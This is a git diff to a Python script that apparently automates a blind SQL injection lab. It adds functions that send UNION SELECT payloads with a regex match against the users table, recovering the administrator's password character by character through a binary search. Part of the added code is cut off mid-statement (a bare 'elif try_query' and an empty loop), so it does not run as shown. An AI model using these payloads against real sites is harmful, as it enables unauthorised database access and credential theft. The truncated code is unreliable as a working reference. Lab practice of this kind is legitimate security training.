@@ -75,10 +75,29 @@ def linear_search():
     print(f"Time elapsed is {time.perf_counter()-begin_time}")
     return prefix
 
+def recursive_binary_search(substring, middle_seperator_of_valid_character_set, administrator_password):
+    if try_query(f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{substring[:middle_seperator_of_valid_character_set]}]'--") and (len(substring) == 1):
+        print(f"Match found: {substring[:middle_seperator_of_valid_character_set]}")
+        administrator_password += substring[:middle_seperator_of_valid_character_set]
+        print(f"Updated Password is: {administrator_password}")
+        return administrator_password
+    elif try_query(f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{substring[middle_seperator_of_valid_character_set:]}]'--") and (len(substring) == 1):
+        print(f"Match found: {substring[middle_seperator_of_valid_character_set:]}")
+        administrator_password += substring[middle_seperator_of_valid_character_set:]
+        print(f"Updated Password is: {administrator_password}")
+        return administrator_password
+    elif try_query
 
 
+def binary_search(url):
+    valid_character_set = string.ascii_lowercase + string.digits
+    administrator_password = ''
+    incomplete_password = True  # Flag, to keep the program going until a whole password is found, which is set by finding a exact match
+    while incomplete_password:
+        middle_seperator_of_valid_character_set = len(valid_character_set) // 2
 
-# Since I will be doing multithreading:
+
+# To clean things up
 if __name__ == "__main__":
     site = sys.argv[1]
     if 'https://' in site:
@@ -91,4 +110,7 @@ if __name__ == "__main__":
 
     # Step #8: Linear Password search:
     reference_password = linear_search()
-    print(f"Password is {reference_password}")
+    print(f"Password reference password is {reference_password}")
+
+    # Step #11: Binary Search:
+    binary_search(url)
